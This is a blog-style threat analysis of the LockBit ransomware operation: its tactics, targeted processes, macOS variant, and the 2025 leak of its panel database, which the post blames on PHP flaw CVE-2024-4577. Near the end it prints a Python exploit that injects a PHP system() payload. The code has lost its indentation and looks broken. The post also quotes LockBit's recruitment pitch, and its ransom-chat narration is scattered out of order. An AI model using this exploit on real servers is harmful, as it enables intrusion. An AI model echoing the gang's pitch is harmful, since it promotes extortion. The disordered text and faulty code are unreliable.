---
title: "LockBit Ransomware: From Cybercriminal Glory to a Critical OPSEC Failure"
date: 2025-05-10 11:27:37 +0200
categories: [Ransomware]
tags: [kimsuky, opsec-failure, ransomware]
image:
  path: DD188ECF-7C57-4154-81C1-33A6DAB2A381.png
  alt: "LockBit Ransomware: From Cybercriminal Glory to a Critical OPSEC Failure"
media_subpath: /assets/img/posts/lockbit-ransomware-from-cybercriminal-glory-to-a-critical-opsec-failure
toc: true
---

What Is **lockbit** ?

**LockBit** is a family of ransomware that takes advantage of widely available protocols and tools, including SMB and PowerShell. Launched in September 2019, **LockBit**‘s operations quickly gained traction by infiltrating networks and encrypting devices. These ransomware services target vulnerable systems and rely on exploiting weak entry points to breach encrypted networks, effectively recruiting new victims through its aggressive tactics.

[Europol](.) described **LockBit** as ‘the world’s biggest ransomware operation.’

They’ve cost the US More Than **$100** million.   
  
**LockBit Ransomware: Techniques and Tactics for Infiltration, Encryption, and Extortion**

LockBit ransomware employs a wide range of sophisticated techniques and tactics to infiltrate systems and encrypt files.

**Encryption**  
After completing the preparation, the ransomware payload encrypts files on the victim’s system. This encryption locks the files and makes them inaccessible without a decryption key. The attackers leave a ransom note in each system folder, demanding payment for the decryption key.

**Infection**  
LockBit gains initial access to IT environments through various methods, including phishing emails, exploiting software vulnerabilities, or leveraging stolen credentials. Attackers can gain access through VPNs, Remote Desktop Protocol (RDP), or other vulnerable points. The LockBit group is also known to recruit insiders—disgruntled employees or others with inside knowledge—who can provide account credentials or even launch the attack from within the network.

**Propagation**  
Once inside, LockBit uses tools like Windows PowerShell and PsExec, along with lateral movement strategies, to explore the network and identify high-value targets. In addition to manual exploitation, LockBit has self-propagation capabilities, allowing it to autonomously spread across the network to find and infect additional hosts without requiring further attacker intervention.

**Preparation**  
During the preparation phase, LockBit malware leverages post-exploitation tools to escalate privileges, force group policy updates, and carry out other actions that set the stage for encryption. This includes disabling security programs and backup tools to prevent the victim from recovering data. The goal at this stage is to make it nearly impossible for the victim to regain access to their data without paying the ransom.

**Exfiltration**  
More recent versions of LockBit have the ability to exfiltrate sensitive files to an external server. This allows the attackers to further extort victims by threatening to publish the stolen data on leak sites. The risk of a public data dump intensifies the pressure on victims to pay the ransom.

---

**The Evolution of LockBit Ransomware**

LockBit ransomware first emerged in September 2019, initially identified as “ABCD” ransomware due to the use of the “.abcd” file extension during encryption. In January 2020, the group transitioned to a Ransomware-as-a-Service (RaaS) model and rebranded as **LockBit**.

In September 2020, the group launched its own website on the Exploit platform, which serves as both a communication hub and a tool for extortion. The website is used to announce new attacks on victims and to publish the data of those who refuse to pay the ransom. While the group primarily communicates in Russian and English, its website claims it operates from the Netherlands and insists that its actions are not politically motivated. However, in February, following the takedown of their website, it was uncovered that LockBit had specifically targeted **Fulton County, Georgia**, threatening to release sensitive data related to Donald Trump’s court cases, suggesting a potential impact on the upcoming U.S. elections.

LockBit’s reach has spanned across multiple industries, including **education, finance, healthcare, internet software and services**, and **professional services**.

---

![](qnq9h9rpc0qzivwlhlli-1024x683.png)

---

**LockBit’s Operations**   
  
LockBit, first detected in late 2019 under the name “ABCD Virus,” represents a significant evolution in ransomware tactics. Operating within a **Ransomware-as-a-Service (RaaS)** model, LockBit provides affiliates with a sophisticated centralized control panel. This platform allows attackers to generate new **LockBit** samples, manage their victims, post ransom notes, and track the success or failure of their operations. This approach makes LockBit one of the most efficient and scalable ransomware families in existence.

Once a foothold is secured, **LockBit** begins to spread quickly and methodically. It often starts with internal reconnaissance and the compromise of administrative credentials. Through lateral movement, the malware can encrypt files across the network in mere hours. This rapid progression highlights a critical challenge: ransomware campaigns can move at a pace faster than human response capabilities. Consequently, automated detection and response systems—capable of reacting at machine speed—are essential to containing the threat before irreversible damage occurs.

**Initial Infection and Propagation**

LockBit’s partners typically gain initial access via **Remote Desktop Protocol (RDP)**, using tried-and-true techniques like phishing attacks and credential stuffing. Once inside, they exploit vulnerabilities—such as unpatched **Fortinet VPN flaws**—to gain deeper access into the network. Forensic investigations show that LockBit affiliates actively seek out high-value, mission-critical systems. Targets include **NAS devices**, **backup servers**, and **domain controllers**, which are essential for maintaining the operational integrity of the organization.

**Automated Lateral Movement and Encryption**

Following initial access, **LockBit** utilizes a variety of post-exploitation tools and techniques to facilitate its spread throughout the network. The ransomware performs lateral movement across systems, identifying key targets while avoiding detection by traditional security mechanisms. In a matter of hours, **LockBit** can compromise the organization’s entire network, rendering it nearly impossible for defenders to respond in real-time.

The encryption process is similarly rapid and relentless, with **LockBit** locking down files across multiple systems. The sophistication of the attack, paired with the rapid deployment, is designed to maximize the impact on the victim, often leaving little time for response or recovery.

**The Growing Threat of Double Extortion**

LockBit is also known for its **double extortion** approach, which involves not only encrypting the victim’s files but also exfiltrating sensitive data. Victims are then extorted for a second ransom to prevent the publication of their stolen data on dark web leak sites. This **dual-threat** tactic adds a layer of pressure on victims, increasing the likelihood of ransom payment.

**A Growing Trend in Ransomware Operations**

The evolution of **LockBit** and similar ransomware groups signifies an alarming trend in cybercrime. As ransomware operations become more sophisticated, attackers are increasingly able to evade arrest and prosecution, often operating from jurisdictions with limited legal repercussions. The speed and scale at which these attacks are carried out continue to grow, and the ransomware threat is now one of the most critical cybersecurity concerns worldwide.

**Processes Monitored by LockBit:**

**LockBit** scans and targets a range of processes across the network to facilitate its attack, including but not limited to:  
**wxServer** / **wxServerView**

**sqlservr** / **RAgui**

**supervise** / **Culture**

**RTVScan** / **DefWatch**

**sqlbrowser** / **winword**

**QBW32** / **QBDBMgr**

**qbupdate** / **QBCFMonitorService**

**axlbridge** / **QBIDPService**

**httpd** / **fdlauncher**

**MsDtSrvr** / **tomcat6**

**zhudongfangyu** / **vmware-usbarbitator64**

---

LockBit is notorious for its expansionist tactics, which include recruiting insiders and even hosting contests in online forums to attract skilled hackers. These strategies have proven highly effective, enabling the group to rapidly expand its network of affiliates. As a result, LockBit has victimized thousands of organizations across various industries, and their malicious activities show no signs of slowing down. This aggressive recruitment approach has contributed to the growing scale and sophistication of their attacks.

![](lockbit-bug-bounty-program-1024x705.png.webp)![](image-1-1024x793.png)

---

**The LockBit Advantage**  
  
With over 75 active affiliates and a proven track record of successful operations, we maintain our position as the industry leader. Our sophisticated infrastructure ensures maximum pressure on targets while providing complete anonymity for our partners.The LockBit Advantage

Join the winning team or become our next countdown.

![](image-2-1024x777.png)

---

**LockBit for macOS**

In May 2023, Flashpoint uncovered that LockBit had begun developing a macOS variant of its ransomware. However, upon investigation, it was found that the macOS version of the malware struggles to execute effectively on Apple devices.

The binary appears to be the **Linux/ESXi** version of LockBit simply recompiled as a **Mach-O** binary rather than an ELF binary. This adaptation results in a number of commands within the malware that are incompatible with macOS, preventing the ransomware from fully executing. According to the decrypted version number, the macOS variant seems to be **version 1.2** of LockBit’s “Linux/ESXi locker” malware.

While this variant does not pose a significant threat in its current state due to execution issues, its existence marks an important development. It suggests that the LockBit group is exploring malware creation for other operating systems, including macOS, indicating potential future threats targeting Apple’s ecosystem.

---

**LockBit** **OPSEC Failure**

On **May 7th, 2025**, reports surfaced that **LockBit ransomware** had suffered a data breach, with details circulating on **X/Twitter**. In the interest of the community, I have decided to share the contents of the leak. Over the next few days, I will be working on polishing and organizing the data to make it more accessible to a wider audience, especially for those who want to avoid the complications that come with dealing with MySQL dump files.

![](image-4-1024x240.png)![](image-3.png)

A preliminary analysis of the database reveals that the dump was created around **April 29, 2025**, indicating that **LockBit** was likely compromised on or before this date. It appears that the breach was followed by a defacement on **May 7**, 2025, suggesting that the attackers gained control of the system and altered or exposed the data shortly before it became public.

![](image-5-1024x724.png)![](image-7.png)

This collection of Bitcoin addresses represents a critical component of LockBit’s ransomware-as-a-service business model, enabling them to receive, manage, and eventually launder ransom payments from victims worldwide.

![](image-8-1024x540.png)

**“Timestamped\_LB\_Chats.txt”** containing an actual ransomware negotiation conversation between a LockBit ransomware operator and a victim. The chat reveals the inner workings of the ransomware extortion process with precise timestamps from December 19, 2024.

The conversation unfolds as follows:

The victim eventually provides a Bitcoin address at 05:57:51 along with an amount (0.03961btc).

![](image-9-1024x541.png)

---

The SQL dump was created on April 29, 2025, at 05:26 PM, approximately 10 days ago. The file shows the export was generated from a local development environment (localhost:3306) running MySQL Server version 8.0.41 on Ubuntu 22.04.1 with PHP version 8.1.2.

![](image-10-1024x502.png)
![](image-11-1024x502.png)

The database configuration reveals several important technical aspects:

- Character set: utf8mb4 with utf8mb4\_general\_ci collation
- Timezone configuration: “+00:00” (UTC)
- SQL mode settings to prevent auto-value generation

## Database Structure

The dump file begins creating a database named “paneldb\_dump” and shows the structure for at least one table called “api\_history”. This table appears designed to track API access with fields including:

- id (unsigned integer primary key)
- host (varchar field for storing hostnames/IPs)
- port (integer field for connection ports)
- selected (timestamp field with default value)

## Security Implications

This exposed database dump represents a significant security breach. The file could contain:

1. Complete database schema revealing application architecture
2. Potentially sensitive records including user credentials, personal information, or authentication tokens
3. Internal API access logs that could reveal network infrastructure

This failure appears to trace back to **CVE-2024-4577**, a vulnerability that could lead to **remote code execution (RCE)**, potentially providing the attackers with the access needed to compromise LockBit’s infrastructure.

At 04:45:24, the operator provides instructions for test file decryption, allowing attachments up to 10MB in various compressed formats (zip, rar, tar, 7zip).

For larger files, they direct victims to their .onion file sharing service, providing three different Tor hidden service URLs.

The victim inquires about decryption costs at 05:40:52.

The operator responds at 05:41:13 with a demand for “4000$” and specifies “we accept bitcoin only.”

The victim attempts to send a test file called “realchristmasglobe.zip” which the operator rejects as “not a correct file.”

Several messages follow with the operator providing specific instructions about not changing file extensions and properly packaging the encrypted files.

At 05:50:18, the operator requests the victim’s Bitcoin wallet address.

**CVE-2024-4577** is a critical vulnerability identified in PHP, specifically affecting versions running on the Windows operating system. This vulnerability, discovered by Orange Tsai of DEVCORE, allows for **Remote Code Execution (RCE)** through PHP CGI Argument Injection[1](https://www.bing.com/ck/a?!&&p=0d82bf9b7f6f28f5e5aca630376d508d194a514a0fae7d0617f6db2a02633a9eJmltdHM9MTc0Njc0ODgwMA&ptn=3&ver=2&hsh=4&fclid=239a33e7-5ca6-6908-100e-26065dd16888&psq=cve-2024-4577&u=a1aHR0cHM6Ly9naXRodWIuY29tL3dhdGNodG93cmxhYnMvQ1ZFLTIwMjQtNDU3Nw&ntb=1).

Affected Versions

The vulnerability impacts the following PHP versions:

- PHP 8.3 < 8.3.8
- PHP 8.2 < 8.2.20
- PHP 8.1 < 8.1.29

Older branches such as PHP 8.0, PHP 7, and PHP 5 are no longer maintained and are also affected[1](https://www.bing.com/ck/a?!&&p=0d82bf9b7f6f28f5e5aca630376d508d194a514a0fae7d0617f6db2a02633a9eJmltdHM9MTc0Njc0ODgwMA&ptn=3&ver=2&hsh=4&fclid=239a33e7-5ca6-6908-100e-26065dd16888&psq=cve-2024-4577&u=a1aHR0cHM6Ly9naXRodWIuY29tL3dhdGNodG93cmxhYnMvQ1ZFLTIwMjQtNDU3Nw&ntb=1).

Exploit Details

The exploit leverages the PHP CGI Argument Injection to execute arbitrary commands on the server. A Proof of Concept (PoC) developed by watchTowr demonstrates this vulnerability. Here is an example of how the exploit can be executed using a Python script:

```
import requests

def exploit(target, command):

payload = f"<?php system('{command}');?>"

url = f"{target}/test.sina"

response = requests.get(url, params={'-c': payload})

if response.status_code == 200:

print("(+) Exploit was successful")

else:

print("(-) Exploit failed")

if __name__ == "__main__":

target = "http://192.168.253.132"

command = "calc"

exploit(target, command)
```

Response From **LockBitSupp** To **REY**

![](image-12-1024x245.png)
![](image-13-1024x242.png)

**Conclusion**   
  
Whether this marks the end of **LockBit** remains uncertain (and likely not), but it undeniably delivers a significant blow to both their **reputation** and **operational credibility**. The incident also highlights an important truth: even sophisticated ransomware gangs are not immune to **basic security failures**—such as relying on outdated software or storing credentials in **plain text**. This breach serves as a stark reminder that poor OPSEC can bring down even the most feared threat actors.
